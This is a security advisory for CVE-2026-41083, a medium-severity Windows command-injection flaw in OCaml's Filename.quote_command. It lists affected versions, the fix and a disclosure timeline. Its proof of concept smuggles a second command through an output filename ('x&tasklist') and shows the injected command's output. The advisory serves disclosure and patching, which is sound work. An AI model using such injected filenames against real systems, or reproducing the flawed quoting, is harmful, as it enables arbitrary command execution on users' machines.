# [M] Windows command execution via filename quotes.

## Summary
Severity: Medium
Advisory: OSEC-2026-05
Aliases: CVE-2026-41083
Ecosystem: opam
CVSS: 6.1 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)
Published: 2026-06-18
Source: https://osv.dev/vulnerability/OSEC-2026-05
Type: osv

## Affected
- opam: `ocaml` — affected >=0 <4.14.4, >=5 <5.5.0, >=0 <ce6d0f7b67145debec57e296dcc49d8619259198, >=0 <39d3f110eab62ab9f3013bb5f084af2dc3e3bb08, >=0 <d5c65dc0034fbd75f10c6b54028e8b2740a7b189

## Details
The quoting of stdin/stdout/stderror (using `Filename.quote_command`) on Windows is not sufficient, and allows the `&` character to be passed through. This allows an attacker to inject a shell command if they can specify the stdin/stdout/stderr of a program to be executed.

## Exploit

```bash
$ opam exec -- ocaml
OCaml version 4.14.2
Enter #help;; for help.

# let outfile = "x&tasklist" in
  let cmd = Filename.quote_command "netsh.exe" ~stdout:outfile ["help"] in
  ignore (Sys.command cmd)
  ;;

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          8 K
System                           4 Services                   0        168 K
Secure System                  236 Services                   0    191,468 K
Registry                       276 Services                   0      3,428 K
smss.exe                       608 Services                   0      1,676 K
csrss.exe                      984 Services                   0      5,928 K
```

## Timeline

- 2026-06-18 release of this security advisory
- 2026-06-15 release of OCaml 4.14.4
- 2026-06-08 fix by David Allsopp https://github.com/ocaml/ocaml/pull/14853
- 2026-04-11 reported by Anil Madhavapeddy, forwarded from Andrew Nesbitt to security@ocaml.org

## References
- https://github.com/ocaml/ocaml/pull/14853
